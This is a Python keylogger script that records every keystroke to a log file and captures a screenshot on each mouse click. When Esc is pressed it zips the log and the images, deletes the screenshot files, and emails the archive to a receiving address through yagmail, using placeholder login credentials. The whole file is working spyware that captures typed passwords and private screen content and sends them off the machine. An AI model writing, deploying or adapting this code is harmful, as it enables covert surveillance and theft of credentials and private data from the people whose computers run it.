from pynput.keyboard import Key
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import pyautogui
import time
import PIL
import shutil
import os

folder = 'C:\\Users\\markk\\Documents\\KeyLoggerPics'
names = []
import yagmail
receiver = "receivingEmail"
yag = yagmail.SMTP("senderEmail", "senderPassword")

file1 = open(folder + '\\' + "loggedData.txt", "a")
startTime = time.time()
file1.write('Start time: ' + time.ctime() + "\n")
lastTime = startTime
isActive = False
#keyboard functions
def onPress(key):
    try:
        file1.write(str(key))
    except AttributeError:
        file1.write("THE SPECIAL KEY " + str(key) + " WAS PRESSED.")

def onRelease(key):
    if key == Key.esc:
        file1.write("\n" + 'End time: ' + time.ctime() + "\n")
        file1.close()
        global folder
        inputPath = folder
        outputPath = 'C:\\Users\\markk\\Downloads\\Pics'
        shutil.make_archive(outputPath, 'zip', inputPath)
        for file in names:
            if os.path.exists(file):
                os.remove(file)

        yag.send(
            to=receiver,
            subject="Logged data",
            contents="",
            attachments = outputPath + '.zip',
        )
        # Stop listener
        keyboard_listener.stop()
        mouse_listener.stop()
#mouse functions




def on_click(x, y, button, pressed):
    global lastTime
    currentTime = time.time()
    if currentTime - lastTime >= 3:
        takeSS(currentTime)

def takeSS(cT):
    currentTime = cT
    global lastTime
    global folder
    sc = pyautogui.screenshot()
    result = time.localtime(currentTime)
    name = str(result.tm_year) + " " + str(result.tm_mon) + " " + str(result.tm_mday) + "--"\
           + str(result.tm_hour) + ";" + str(result.tm_min)\
           + ";" + str(result.tm_sec) + '.png'
    path = folder + '\\' + name
    sc.save(path)
    names.append(path)


    lastTime = currentTime


keyboard_listener = KeyboardListener(on_press=onPress, on_release=onRelease)
mouse_listener = MouseListener(on_click=on_click)
keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()